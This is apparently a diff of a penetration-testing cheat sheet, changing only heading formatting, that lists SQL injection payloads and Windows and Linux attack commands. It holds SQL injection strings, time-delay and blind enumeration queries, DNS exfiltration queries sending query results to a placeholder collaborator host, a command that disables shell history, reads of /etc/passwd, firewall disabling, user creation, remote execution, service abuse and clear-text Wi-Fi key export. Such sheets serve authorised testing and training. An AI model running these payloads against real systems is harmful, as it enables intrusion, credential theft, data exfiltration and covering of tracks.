+-   [[http://manpages.ubuntu.com/manpages/bionic/pt/man3/strtod.3.html]{.underline}](http://manpages.ubuntu.com/manpages/bionic/pt/man3/strtod.3.html)
 
-[]{#anchor-113}SQL Tests
+SQL Injection
+=============
 
-  ---------------- -------------- ---------------- ------------------ ------------------ -------------------
+SQL Tests
+---------
+
   or 1=1           \'or 1=1       \"or 1=1         or 1=1-            \'or 1=1-          \"or 1=1-
+  ---------------- -------------- ---------------- ------------------ ------------------ -------------------
   or 1=1\#         \'or 1=1\#     \"or             1=1\#              or 1=1/\*          \'or 1=1/\*
   \"or 1=1/\*      or 1=1;%00     \'or 1=1;%00     \"or 1=1;%00       \'or\'             \'or
   \'or\'-          \'or-          or a=a           \'or a=a           \"or a=a           or a=a-
   \'or a=a-        \"or a=a-      or \'a\'=\'a\'   \'or \'a\'=\'a\'   \"or \'a\'=\'a\'   \')or(\'a\'=\'a\'
   \")\"a\"=\"a\"   \')\'a\'=\'a   \'or\"=\'        \' or 1=1\--       \" or 1=1\--       or 1=1\--
   \" or 1=1\#                                                                            
-  ---------------- -------------- ---------------- ------------------ ------------------ -------------------
 
-[]{#anchor-114}SQL Comment Formats
+SQL Comment Formats
+-------------------
 
-[]{#anchor-115}Microsoft SQL/PostgreSQL v1
+### Microsoft SQL/PostgreSQL v1
 
   ------------
   \--comment
   ------------
 
-[]{#anchor-116}Microsoft SQL/PostgreSQL v1
+### Microsoft SQL/PostgreSQL v1
 
   ---------------
   /\*comment\*/
   ---------------
 
-[]{#anchor-117}Oracle v1
+### Oracle v1
 
   ------------
   \--comment
   ------------
 
-[]{#anchor-118}MySQL v1 (Note the space)
+### MySQL v1 (Note the space)
 
   -------------
   \-- comment
   -------------
 
-[]{#anchor-119}MySQL v2
+### MySQL v2
 
   -----------
   \#comment
   -----------
 
-[]{#anchor-120}MySQL v3
+### MySQL v3
 
   ---------------
   /\*comment\*/
   ---------------
 
-[]{#anchor-121}SQL String Concatenation
+SQL String Concatenation
+------------------------
 
-[]{#anchor-122}Oracle & PostgreSQL
+### Oracle & PostgreSQL
 
   --------------------
   \'foo\'\|\|\'bar\'
   --------------------
 
-[]{#anchor-123}MySQL
+### MySQL
 
 +-------------------------+
 | \'foo\' \'bar\'         |
@@ -1255,67 +1320,70 @@ could lead to type juggling.
 | CONCAT(\'foo\',\'bar\') |
 +-------------------------+
 
-[]{#anchor-124}Microsoft
+### Microsoft
 
   -----------------
   \'foo\'+\'bar\'
   -----------------
 
-[]{#anchor-125}SQL Time Delays
+SQL Time Delays
+---------------
 
-[]{#anchor-126}Oracle
+### Oracle
 
   -----------------------------------------
   dbms\_pipe.receive\_message((\'a\'),10)
   -----------------------------------------
 
-[]{#anchor-127}Microsoft
+### Microsoft
 
   --------------------------
   WAITFOR DELAY \'0:0:10\'
   --------------------------
 
-[]{#anchor-128}PostgreSQL
+### PostgreSQL
 
   ----------------------
   SELECT pg\_sleep(10)
   ----------------------
 
-[]{#anchor-129}MySQL
+### MySQL
 
   ------------------
   SELECT sleep(10)
   ------------------
 
-[]{#anchor-130}SQL Conditional Time Delays
+SQL Conditional Time Delays
+---------------------------
 
-[]{#anchor-131}Oracle
+### Oracle
 
   ----------------------------------------------------------------------------------------------------------------------
   SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN \'a\'\|\|dbms\_pipe.receive\_message((\'a\'),10) ELSE NULL END FROM dual
   ----------------------------------------------------------------------------------------------------------------------
 
-[]{#anchor-132}Microsoft
+### Microsoft
 
   ---------------------------------------------------
   IF (YOUR-CONDITION-HERE) WAITFOR DELAY \'0:0:10\'
   ---------------------------------------------------
 
-[]{#anchor-133}PostgreSQL
+### PostgreSQL
 
   ---------------------------------------------------------------------------------
   SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg\_sleep(10) ELSE pg\_sleep(0) END
   ---------------------------------------------------------------------------------
 
-[]{#anchor-134}MySQL
+### MySQL
 
   ------------------------------------------------
   SELECT IF(YOUR-CONDITION-HERE,sleep(10),\'a\')
   ------------------------------------------------
 
-[]{#anchor-135}SQL DNS Lookup
+SQL DNS Lookup
+--------------
 
-[]{#anchor-136}Oracle
+### Oracle
 
 +-----------------------------------------------------------------------+
 | SELECT extractvalue(xmltype(\'\<?xml version=\"1.0\"                  |
@@ -1330,19 +1398,19 @@ could lead to type juggling.
 | .net\')                                                               |
 +-----------------------------------------------------------------------+
 
-[]{#anchor-137}Microsoft
+### Microsoft
 
   ---------------------------------------------------------------------------
   exec master..xp\_dirtree \'//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a\'
   ---------------------------------------------------------------------------
 
-[]{#anchor-138}PostgreSQL
+### PostgreSQL
 
   -------------------------------------------------------------------------------------
   copy (SELECT \'\') to program \'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net\'
   -------------------------------------------------------------------------------------
 
-[]{#anchor-139}MySQL (Windows only)
+### MySQL (Windows only)
 
 +-----------------------------------------------------------------------+
 | LOAD\_FILE(\'\\\\\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\\\a\') |
@@ -1351,21 +1419,22 @@ could lead to type juggling.
 | \'\\\\\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a\'               |
 +-----------------------------------------------------------------------+
 
-[]{#anchor-140}SQL DNS Lookup w/Data Exfiltration
+SQL DNS Lookup w/Data Exfiltration
+----------------------------------
 
-[]{#anchor-141}Oracle
+### Oracle
 
   ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
   SELECT extractvalue(xmltype(\'\<?xml version=\"1.0\" encoding=\"UTF-8\"?\>\<!DOCTYPE root \[ \<!ENTITY % remote SYSTEM \"http://\'\|\|(SELECT YOUR-QUERY-HERE)\|\|\'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/\"\> %remote;\]\>\'),\'/l\') FROM dual
   ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-[]{#anchor-142}Microsoft
+### Microsoft
 
   -----------------------------------------------------------------------------------------------------------------------------------------------------
   declare \@p varchar(1024);set \@p=(SELECT YOUR-QUERY-HERE);exec(\'master..xp\_dirtree \"//\'+\@p+\'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a\"\')
   -----------------------------------------------------------------------------------------------------------------------------------------------------
 
-[]{#anchor-143}PostgreSQL
+### PostgreSQL
 
 +-----------------------------------------------------------------------+
 | create OR replace function f() returns void as \$\$                   |
@@ -1390,51 +1459,52 @@ could lead to type juggling.
 | SELECT f();                                                           |
 +-----------------------------------------------------------------------+
 
-[]{#anchor-144}MySQL (Windows only)
+### MySQL (Windows only)
 
   ---------------------------------------------------------------------------------------------
   SELECT YOUR-QUERY-HERE INTO OUTFILE \'\\\\\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a\'
   ---------------------------------------------------------------------------------------------
 
-[]{#anchor-145}SQL Database Enumeration Examples
+SQL Database Enumeration Examples
+---------------------------------
 
-[]{#anchor-146}Discover Database Version (Microsoft SQL, MySQL)
+### Discover Database Version (Microsoft SQL, MySQL)
 
   --------------------------------------------------------------------------------
   http://\<someserver\>/comment.php?id=758 union all select 1,2,3,4,@\@version,6
   --------------------------------------------------------------------------------
 
-[]{#anchor-147}Discover Database Version v1 (Oracle)
+### Discover Database Version v1 (Oracle)
 
   --------------------------------------------------------------------------------
   http://\<someserver\>/comment.php?id=758 union all select 1,2,3,4,v\$version,6
   --------------------------------------------------------------------------------
 
-[]{#anchor-148}Discover Database Version v2 (Oracle)
+### Discover Database Version v2 (Oracle)
 
   --------------------------------------------------------------------------------------------
   http://\<someserver\>/comment.php?id=758 union all select 1,2,3,4,banner,6 FROM v\$version
   --------------------------------------------------------------------------------------------
 
-[]{#anchor-149}Discover Database Version v3 (Oracle)
+### Discover Database Version v3 (Oracle)
 
   ----------------------------------------------------------------------------------------------
   http://\<someserver\>/comment.php?id=758 union all select 1,2,3,4,version,6 FROM v\$instance
   ----------------------------------------------------------------------------------------------
 
-[]{#anchor-150}Discover Database Version (PostgreSQL)
+### Discover Database Version (PostgreSQL)
 
   -------------------------------------------------------------------------------
   http://\<someserver\>/comment.php?id=758 union all select 1,2,3,4,version(),6
   -------------------------------------------------------------------------------
 
-[]{#anchor-151}Discover Database User
+### Discover Database User
 
   ----------------------------------------------------------------------------
   http://\<someserver\>/comment.php?id=758 union all select 1,2,3,4,user(),6
   ----------------------------------------------------------------------------
 
-[]{#anchor-152}Enumerating Table Names (MySQL, Microsoft SQL)
+### Enumerating Table Names (MySQL, Microsoft SQL)
 
 This example is injecting a "union all select" statement to place the
 list of table names into column 5
@@ -1447,8 +1517,7 @@ list of table names into column 5
   \%\' and 1=0 union select null, table\_name from information\_schema.tables \#
   --------------------------------------------------------------------------------
 
-[]{#anchor-153}Enumerating Column Names of a Table (MySQL, Microsoft
-SQL)
+### Enumerating Column Names of a Table (MySQL, Microsoft SQL)
 
 This example is injecting a "union all select" statement to list the
 column names of the supplied talle.
@@ -1461,55 +1530,60 @@ column names of the supplied talle.
   \%\' and 1=0 union select null, column\_name from information\_schema.columns where table\_name = \'users\' \#"
   -----------------------------------------------------------------------------------------------------------------
 
-[]{#anchor-154}Enumerating Table Names (Oracle)
+### Enumerating Table Names (Oracle)
 
   -------------------------------------
   SELECT table\_name FROM all\_tables
   -------------------------------------
 
-[]{#anchor-155}Enumerating Column Names (Oracle)
+### Enumerating Column Names (Oracle)
 
   ----------------------------------------------------------------------------------------
   SELECT column\_name FROM all\_tab\_columns WHERE table\_name = \'**\<table\_name\>**\'
   ----------------------------------------------------------------------------------------
 
-[]{#anchor-156}Collecting Specific Information
+### Collecting Specific Information
 
   ------------------------------------------------
   \%\' UNION SELECT user, password from users \#
   ------------------------------------------------
 
-[]{#anchor-157}Error Based Blind Enumeration
+### Error Based Blind Enumeration
 
-[]{#anchor-158}Enumerate Database Name
+#### Enumerate Database Name
 
   ------------------------------------------------------------------------
   1 AND ORD(MID((SELECT IFNULL(CAST(database() AS CHAR), 0x20)),1,1))\>1
   ------------------------------------------------------------------------
 
-[]{#anchor-159}Enumerate Table Name
+#### Enumerate Table Name
 
   ----------------------------------------------------------------------------------------------------------------------------------------------------------------------
   1 AND ORD(MID((SELECT IFNULL(CAST(table\_name AS CHAR),0x20) FROM information\_schema.tables WHERE table\_schema=database() ORDER BY table\_name LIMIT 0,1),1,1))\>1
   ----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-[]{#anchor-160}Enumerate Column Name
+#### Enumerate Column Name
 
   ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
   1 AND ORD(MID((SELECT IFNULL(CAST(column\_name AS CHAR),0x20) FROM information\_schema.columns WHERE table\_name=0x6775657374626f6f6b ORDER BY column\_name LIMIT 0,1),1,1))\>1
   ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-[]{#anchor-161}Enumerate Field Value
+#### Enumerate Field Value
 
 Explaination:
 
 -   ORD(string) - Returns the leftmost character in a string
+
 -   MID(string, position, length) - Extracts a substring, returns 5th
-    position single character
+    > position single character
+
 -   IFNULL(expression1, expression2) - Returns 1st expression is not
-    NULL, otherwise returns 2nd
+    > NULL, otherwise returns 2nd
+
 -   CAST() - Casts the string containing the column name to CHAR
+
 -   0x20 is a space and the first printable ASCII character
+
 -   LIMIT 0, 1 - Returns first single row.
 
 This query will return true if the single character that is in the 5th
@@ -1523,49 +1597,55 @@ is NULL/non-existent.
   1 AND ORD(MID((SELECT IFNULL(CAST(name AS CHAR),0x20) FROM dvwa.guestbook ORDER BY name LIMIT 0,1),5,1))\>1
   -------------------------------------------------------------------------------------------------------------
 
-[]{#anchor-162}Linux Commands
+Linux Commands
+==============
 
-[]{#anchor-163}Disable Command History
+Disable Command History
+-----------------------
 
   ----------------
   unset HISTFILE
   ----------------
 
-[]{#anchor-164}Check Linux Distribution
+Check Linux Distribution
+------------------------
 
-[]{#anchor-165}Method 1
+### Method 1
 
   ---------------------
   cat /etc/\*-release
   ---------------------
 
-[]{#anchor-166}Method 2
+### Method 2
 
   -----------------
   Lsb\_release -a
   -----------------
 
-[]{#anchor-167}Remove All Lines with non-ASCII Characters
+Remove All Lines with non-ASCII Characters
+------------------------------------------
 
   ------------------------------------------------------------------
   perl -nle \'print if m{\^\[\[:ascii:\]\]+\$}\' **\<inputfile\>**
   ------------------------------------------------------------------
 
-[]{#anchor-168}Remove All Lines with ASCII Characters
+Remove All Lines with ASCII Characters
+--------------------------------------
 
   -------------------------------------------------------------------
   perl -nle \'print if !m{\^\[\[:ascii:\]\]+\$}\' **\<inputfile\>**
   -------------------------------------------------------------------
 
-[]{#anchor-169}Convert From Windows(dos) to Unix File Format
+Convert From Windows(dos) to Unix File Format
+---------------------------------------------
 
-[]{#anchor-170}dos2unix
+### dos2unix
 
   ---------------------------
   dos2unix **\<filename\>**
   ---------------------------
 
-[]{#anchor-171}vi(m)
+### vi(m)
 
 +------------------------------------------------+
 | :1,\$s/\^M//g                                  |
@@ -1577,25 +1657,26 @@ is NULL/non-existent.
 | To enter "\^M" press **CTRL+V** then **Enter** |
 +------------------------------------------------+
 
-[]{#anchor-172}awk
+### awk
 
   -----------------------------------------------------------------------------
   awk \'{ sub(\"\\r\$\", \"\"); print }\' **\<winfile\>** \> **\<unixfile\>**
   -----------------------------------------------------------------------------
 
-[]{#anchor-173}perl
+### perl
 
   -----------------------------------------------------------------
   perl -p -e \'s/\\r\$//\' \< **\<winfile\>** \> **\<unixfile\>**
   -----------------------------------------------------------------
 
-[]{#anchor-174}tr
+### tr
 
   -----------------------------------------------------------
   tr -d \'\\15\\32\' \< **\<winfile\>** \> **\<unixfile\>**
   -----------------------------------------------------------
 
-[]{#anchor-175}Dump Samba Credentials
+Dump Samba Credentials
+----------------------
 
   -------------
   pdbdump -Lw
@@ -1605,35 +1686,38 @@ is NULL/non-existent.
   pbtool **\<file\>** dump
   --------------------------
 
-[]{#anchor-176}Execute Commands Without Spaces (Examples)
+Execute Commands Without Spaces (Examples)
+------------------------------------------
 
   ------------------------------------------------
   IFS=,;\`cat\<\<\<cat,/etc/passwd\`\
   cat\$IFS/etc/passwd\
   cat\${IFS}/etc/passwd\
-  cat\</etc/passwd \
+  cat\</etc/passwd\
   {cat,/etc/passwd} OR {ls,-las,/var} with args\
   X=\$\'cat\\x20/etc/passwd\'&&\$X
 
   ------------------------------------------------
 
-[]{#anchor-177}Windows Commands
+Windows Commands
+================
 
-[]{#anchor-178}PowerShell
+PowerShell
+----------
 
-[]{#anchor-179}Encoding Commands from File (Linux)
+### Encoding Commands from File (Linux)
 
   --------------------------------------------------------
   iconv -f ASCII -t UTF-16LE **\<file\>** \| base64 -w 0
   --------------------------------------------------------
 
-[]{#anchor-180}Encoding Commands from Inline (Linux)
+### Encoding Commands from Inline (Linux)
 
   --------------------------------------------------------------
   echo \"**\<command\>**\" \| iconv -t UTF-16LE \| base64 -w 0
   --------------------------------------------------------------
 
-[]{#anchor-181}Encoding Commands with Python
+### Encoding Commands with Python
 
 +-----------------------------------------------------+
 | from base64 import b64encode                        |
@@ -1641,7 +1725,7 @@ is NULL/non-existent.
 | b64encode(\'**\<command\>**\').encode(\'UTF-16LE\') |
 +-----------------------------------------------------+
 
-[]{#anchor-182}Encoding Commands with Ruby
+### Encoding Commands with Ruby
 
 +--------------------------------------------------------------------+
 | require \"base64\"                                                 |
@@ -1649,203 +1733,208 @@ is NULL/non-existent.
 | Base64.encode64(\'**\<command\>**\'.force\_encoding(\'UTF-16LE\')) |
 +--------------------------------------------------------------------+
 
-[]{#anchor-183}Checking for Access Level
+Checking for Access Level
+-------------------------
 
-[]{#anchor-184}Check Username
+### Check Username
 
   -----------------
   Echo %USERNAME%
   -----------------
 
-[]{#anchor-185}Use DIR to Check For Admin Rights
+### Use DIR to Check For Admin Rights
 
   ---------------------------
   dir \\\\**\<host\>**\\C\$
   ---------------------------
 
-[]{#anchor-186}Use AT to Check For Admin Rights
+### Use AT to Check For Admin Rights
 
   ---------------------
   at \\\\**\<host\>**
   ---------------------
 
-[]{#anchor-187}System Details
+System Details
+--------------
 
-[]{#anchor-188}Discover Domain (workstation)
-
-  ------------------------
-  net config workstation
-  ------------------------
-
-[]{#anchor-189}Discover Domain (server)
+### Discover Domain (workstation)
 
   ------------------------
   net config workstation
   ------------------------
 
-[]{#anchor-190}View Domain Controller Name Via Registry
+### Discover Domain (server)
+
+  ------------------------
+  net config workstation
+  ------------------------
+
+### View Domain Controller Name Via Registry
 
   ----------------------------------------------------------------------------------------------------
   reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\ CurrentVersion\\Group Policy\\History\" /v DCName
   ----------------------------------------------------------------------------------------------------
 
-[]{#anchor-191}Check Patch Level
+### Check Patch Level
 
   -------------------------------------------------------
   wmic qfe get Caption,Description,HotFixID,InstalledOn
   -------------------------------------------------------
 
-[]{#anchor-192}Check for Specific Installed Path
+### Check for Specific Installed Path
 
   ------------------------------------------------------------------------------------------
   wmic qfe get Caption,Description,HotFixID,InstalledOn \| findstr /C:\"**\<kbnumber\>**\"
   ------------------------------------------------------------------------------------------
 
-[]{#anchor-193}Get Drive Details
+### Get Drive Details
 
   -------------------------------------------------------
   wmic logicaldisk get caption,description,providername
   -------------------------------------------------------
 
-[]{#anchor-194}Firewall
+Firewall
+--------
 
-[]{#anchor-195}Disable Firewall (Windows XP)
+### Disable Firewall (Windows XP)
 
   -----------------------------------
   netsh firewall set opmode disable
   -----------------------------------
 
-[]{#anchor-196}Enable Firewall (Windows XP)
+### Enable Firewall (Windows XP)
 
   ----------------------------------
   netsh firewall set opmode enable
   ----------------------------------
 
-[]{#anchor-197}Disable Firewall (Windows Vista, Requires Elevation, UAC)
+### Disable Firewall (Windows Vista, Requires Elevation, UAC)
 
   ------------------------------------------------
   netsh advfirewall set currentprofile state off
   ------------------------------------------------
 
-[]{#anchor-198}Enable Firewall (Windows Vista, Requires Elevation, UAC)
+### Enable Firewall (Windows Vista, Requires Elevation, UAC)
 
   -----------------------------------------------
   netsh advfirewall set currentprofile state on
   -----------------------------------------------
 
-[]{#anchor-199}Check Firewall Status (Windows Vista & Newer)
+### Check Firewall Status (Windows Vista & Newer)
 
   ---------------------------------
   netsh advfirewall firewall dump
   ---------------------------------
 
-[]{#anchor-200}Check Firewall Status (Windows XP)
+### Check Firewall Status (Windows XP)
 
   ---------------------------
   netsh firewall show state
   ---------------------------
 
-[]{#anchor-201}Show Firewall Configuration (Windows XP)
+### Show Firewall Configuration (Windows XP)
 
   ----------------------------
   Netsh firewall show config
   ----------------------------
 
-[]{#anchor-202}User & Group Commands
+User & Group Commands
+---------------------
 
-[]{#anchor-203}Current User Privileges
+### Current User Privileges
 
   --------------
   whoami /priv
   --------------
 
-[]{#anchor-204}Current User Groups
+### Current User Groups
 
   ----------------
   whoami /groups
   ----------------
 
-[]{#anchor-205}User Details (local)
+### User Details (local)
 
   ---------------------------
   net user **\<username\>**
   ---------------------------
 
-[]{#anchor-206}User Details (domain)
+### User Details (domain)
 
   -----------------------------------
   net user **\<username\>** /domain
   -----------------------------------
 
-[]{#anchor-207}Create a User
+### Create a User
 
   -------------------------------------------------
   net user **\<username\>** **\<password\>** /ADD
   -------------------------------------------------
 
-[]{#anchor-208}Add a User to a Group
+### Add a User to a Group
 
   --------------------------------------------------------
   net localgroup **\<groupname\>** **\<username\>** /add
   --------------------------------------------------------
 
-[]{#anchor-209}Find Domain Admins
+### Find Domain Admins
 
   -------------------------------------
   net group \"Domain Admins\" /domain
   -------------------------------------
 
-[]{#anchor-210}Find Enterprise Admins
+### Find Enterprise Admins
 
   ---------------------------------------
   net group "Enterprise Admins" /domain
   ---------------------------------------
 
-[]{#anchor-211}List Local Groups
+### List Local Groups
 
   ----------------
   net localgroup
   ----------------
 
-[]{#anchor-212}List Local Group Members
+### List Local Group Members
 
   ----------------------------------
   net localgroup **\<groupname\>**
   ----------------------------------
 
-[]{#anchor-213}List Local Password Policy
+### List Local Password Policy
 
   --------------
   net accounts
   --------------
 
-[]{#anchor-214}List Domain Password Policy
+### List Domain Password Policy
 
   ----------------------
   net accounts /domain
   ----------------------
 
-[]{#anchor-215}Command Execution
+Command Execution
+-----------------
 
-[]{#anchor-216}WMIC Execute a Command (Admin)
+### WMIC Execute a Command (Admin)
 
   -----------------------------------------------------------------
   wmic /node:"**\<host\>**" process call create "**\<program\>**"
   -----------------------------------------------------------------
 
-[]{#anchor-217}PowerShell Execute a Command (Admin, WinRM, Port 5985)
+### PowerShell Execute a Command (Admin, WinRM, Port 5985)
 
   ----------------------------------------------------------------------------
   Invoke-Command -ComputerName **\<host\>** -ScriptBlock { **\<command\>** }
   ----------------------------------------------------------------------------
 
-[]{#anchor-218}PowerSploit Execute a Command (Admin, Non-Bind)
+### PowerSploit Execute a Command (Admin, Non-Bind)
 
   ------------------------------------------------------------------------------------------------------------
   Invoke-WmiCommand -ComputerName **\<target\>** -Payload { **\<command\>** } \| select -exp "PayloadOutput"
   ------------------------------------------------------------------------------------------------------------
 
-[]{#anchor-219}PowerShell Execution of SCT File Using .NET Assemblies
+### PowerShell Execution of SCT File Using .NET Assemblies
 
 +-----------------------------------------------------------------------+
 | \[Reflection.Assembly\]::LoadWithPartialName(\'Microsoft.JScript\');  |
@@ -1855,9 +1944,10 @@ is NULL/non-existent.
 | ngine());                                                             |
 +-----------------------------------------------------------------------+
 
-[]{#anchor-220}Lateral Movement
+Lateral Movement
+----------------
 
-[]{#anchor-221}Create Service w/WINRM.EXE
+### Create Service w/WINRM.EXE
 
 +-----------------------------------------------------------------------+
 | winrm invoke Create wmicimv2/Win32\_Service                           |
@@ -1869,113 +1959,115 @@ is NULL/non-existent.
 | -r:http://**\<hostname\>**:5985                                       |
 +-----------------------------------------------------------------------+
 
-[]{#anchor-222}Processes
+Processes
+---------
 
-[]{#anchor-223}PowerShell - Get-Process
+### PowerShell - Get-Process
 
   -------------
   Get-Process
   -------------
 
-[]{#anchor-224}TaskList List Processes
+### TaskList List Processes
 
   -----------------------------
   tasklist /v /S **\<host\>**
   -----------------------------
 
-[]{#anchor-225}TaskList Kill Processes
+### TaskList Kill Processes
 
   ----------------------------------------------
   tasklist /S **\<host\>** /PID **\<pid\>** /F
   ----------------------------------------------
 
-[]{#anchor-226}Find a Specific Processes Information
+### Find a Specific Processes Information
 
   ------------------------------------------------
   tasklist \| findstr /i "**\<process\_name\>**"
   ------------------------------------------------
 
-[]{#anchor-227}WMIC List Processes - Full
+### WMIC List Processes - Full
 
   ---------------------------------------------
   wmic /node:"**\<host\>**" process list full
   ---------------------------------------------
 
-[]{#anchor-228}WMIC List Processes - Brief
+### WMIC List Processes - Brief
 
   ----------------------------------------------
   wmic /node:"**\<host\>**" process list brief
   ----------------------------------------------
 
-[]{#anchor-229}WMIC Kill Process by PID
+### WMIC Kill Process by PID
 
   ----------------------------------------------------------------------------
   wmic /node:"**\<host\>**" where (ProcessID = "**\<PID\>**") call terminate
   ----------------------------------------------------------------------------
 
-[]{#anchor-230}WMIC Kill Process by Name
+### WMIC Kill Process by Name
 
   ---------------------------------------------------------------------------
   wmic /node:"**\<host\>**" where (Name = "**\<PE Name\>**") call terminate
   ---------------------------------------------------------------------------
 
-[]{#anchor-231}Services
+Services
+--------
 
-[]{#anchor-232}List Services
+### List Services
 
-[*https://technet.microsoft.com/en-us/library/cc990290(v=ws.11).aspx*](https://technet.microsoft.com/en-us/library/cc990290(v=ws.11).aspx)
+[[https://technet.microsoft.com/en-us/library/cc990290(v=ws.11).aspx]{.underline}](https://technet.microsoft.com/en-us/library/cc990290(v=ws.11).aspx)
 
   -----------------------------------
   sc query type= service state= all
   -----------------------------------
 
-[]{#anchor-233}List Services (Old Way)
+### List Services (Old Way)
 
   -----------
   net start
   -----------
 
-[]{#anchor-234}Find Services with Unquoted Paths (wmic)
+### Find Services with Unquoted Paths (wmic)
 
   ---------------------------------------------------------------------------------------------------------------------------------------
   wmic service get name,displayname,pathname,startmode \|findstr /i \"Auto\" \|findstr /i /v \"C:\\Windows\\\\\" \|findstr /i /v \"\"\"
   ---------------------------------------------------------------------------------------------------------------------------------------
 
-[]{#anchor-235}Find Services with Unquoted Paths (PowerShell)
+### Find Services with Unquoted Paths (PowerShell)
 
   ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
   Get-WmiObject win32\_service \| select name,pathname \| Where-Object -Filter { \$\_.pathname -notlike \"\`\"\*\`\"\*\" -and \$\_.pathname -notlike \"C:\\WINDOWS\\\*\" -and -\$\_.pathname }
   ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-[]{#anchor-236}Enable Service (Admin or User Modifiable Service)
+### Enable Service (Admin or User Modifiable Service)
 
   -----------------------------------------
   sc config **\<service\>** start= demand
   -----------------------------------------
 
-[]{#anchor-237}Start Service (Admin or User Modifiable Service)
+### Start Service (Admin or User Modifiable Service)
 
   ---------------------------
   net start **\<service\>**
   ---------------------------
 
-[]{#anchor-238}Stop Service (Admin or User Modifiable Service)
+### Stop Service (Admin or User Modifiable Service)
 
   --------------------------
   net stop **\<service\>**
   --------------------------
 
-[]{#anchor-239}Create a Service (Admin, Service PE)
+### Create a Service (Admin, Service PE)
 
   ------------------------------------------------------------------
   sc \\\\**\<host\>** create **\<name\>** binpath= **\<program\>**
   ------------------------------------------------------------------
 
-**Note: **You can create a service that runs CMD with the /C or /K that
+**Note:** You can create a service that runs CMD with the /C or /K that
 specified another command. Windows will kill the CMD but leave the
 program it runs active.
 
-[]{#anchor-240}Edit a Writable Service (use accesschk.exe to find one)
+### Edit a Writable Service (use accesschk.exe to find one)
 
 +------------------------------------------------------------------------+
 | \# Change the command                                                  |
@@ -1987,9 +2079,10 @@ program it runs active.
 | sc config **\<servicename\>** obj= ".\\LocalSystem" password= ""       |
 +------------------------------------------------------------------------+
 
-[]{#anchor-241}Scheduled Tasks (Admin)
+Scheduled Tasks (Admin)
+-----------------------
 
-[]{#anchor-242}Schedule a Task with AT
+### Schedule a Task with AT
 
 +---------------------------------------+
 | **Check the time with:**              |
@@ -2001,7 +2094,7 @@ program it runs active.
 | at \\\\**\<host\> HH:MM \<command\>** |
 +---------------------------------------+
 
-[]{#anchor-243}Schedule a Task with SCHTASKS
+### Schedule a Task with SCHTASKS
 
 +-----------------------------------------------------------------------+
 | **Create the task:**                                                  |
@@ -2014,199 +2107,205 @@ program it runs active.
 | schtasks /run /tn **\<name\>** /S **\<host\>**                        |
 +-----------------------------------------------------------------------+
 
-[]{#anchor-244}Network Discovery
+Network Discovery
+-----------------
 
-[]{#anchor-245}PowerShell - List Connections
+### PowerShell - List Connections
 
   ----------------------
   Get-NetTCPConnection
   ----------------------
 
-[]{#anchor-246}List Established Connections
+### List Established Connections
 
   -----------------------------------------------
   netstat -anp **\[tcp\|udp\]** \| find "ESTAB"
   -----------------------------------------------
 
-[]{#anchor-247}List Listening Ports
+### List Listening Ports
 
   ------------------------------------------------
   netstat -anp **\[tcp\|udp\]** \| find "LISTEN"
   ------------------------------------------------
 
-[]{#anchor-248}List Open Ports with PIDs
+### List Open Ports with PIDs
 
   --------------
   netstat -ano
   --------------
 
-[]{#anchor-249}Show IP Addressing Configuration Details
+### Show IP Addressing Configuration Details
 
   -----------------------------------
   netsh interface ip show addresses
   -----------------------------------
 
-[]{#anchor-250}Show IP Routing Configuration Details
+### Show IP Routing Configuration Details
 
   -------------------------------
   netsh interface ip show route
   -------------------------------
 
-[]{#anchor-251}Show IP Neighbor Details
+### Show IP Neighbor Details
 
   -----------------------------------
   netsh interface ip show neighbors
   -----------------------------------
 
-[]{#anchor-252}ARP Table List
+### ARP Table List
 
   --------
   arp -a
   --------
 
-[]{#anchor-253}Display DNS Cache
+### Display DNS Cache
 
   ----------------------
   ipconfig /displaydns
   ----------------------
 
-[]{#anchor-254}Display Ports with Connections and Processes
+### Display Ports with Connections and Processes
 
   ---------------
   netstat -nabo
   ---------------
 
-[]{#anchor-255}Display Routing Table (netstat)
+### Display Routing Table (netstat)
 
   ------------
   netstat -r
   ------------
 
-[]{#anchor-256}Display Routing Table (route)
+### Display Routing Table (route)
 
   -------------
   route print
   -------------
 
-[]{#anchor-257}Find Specific Listening Port
+### Find Specific Listening Port
 
   --------------------------------------
   netstat -na \| findstr :**\<port\>**
   --------------------------------------
 
-[]{#anchor-258}Find Listening Ports and PIDs
+### Find Listening Ports and PIDs
 
   -----------------------------------
   netstat -nao \| findstr LISTENING
   -----------------------------------
 
-[]{#anchor-259}Find Hosts in the Same Workgroup
+### Find Hosts in the Same Workgroup
 
   ----------
   net view
   ----------
 
-[]{#anchor-260}Find Hosts in Another Domain
+### Find Hosts in Another Domain
 
   ---------------------------------
   net view /domain:**\<domain\>**
   ---------------------------------
 
-[]{#anchor-261}Find Visible Domains
+### Find Visible Domains
 
   ------------------
   net view /domain
   ------------------
 
-[]{#anchor-262}Find Domain Controllers
+### Find Domain Controllers
 
   ----------------------------------------
   net group "Domain Controllers" /domain
   ----------------------------------------
 
-[]{#anchor-263}Get Domain/Domain Controller Details
+### Get Domain/Domain Controller Details
 
   --------------------
   wmic ntdomain list
   --------------------
 
-[]{#anchor-264}List HOSTS File Contents
+### List HOSTS File Contents
 
   ----------------------------------------------
   type %WINDIR%\\System32\\drivers\\etc\\hosts
   ----------------------------------------------
 
-[]{#anchor-265}Windows Wireless Networking
+Windows Wireless Networking
+---------------------------
 
-[]{#anchor-266}List Saved Wireless Profiles
+### List Saved Wireless Profiles
 
   --------------------------
   netsh wlan show profiles
   --------------------------
 
-[]{#anchor-267}Export Saved Wireless Profile
+### Export Saved Wireless Profile
 
   ----------------------------------------------
   netsh wlan export profile folder=. key=clear
   ----------------------------------------------
 
-[]{#anchor-268}Add Specified Wireless Profile
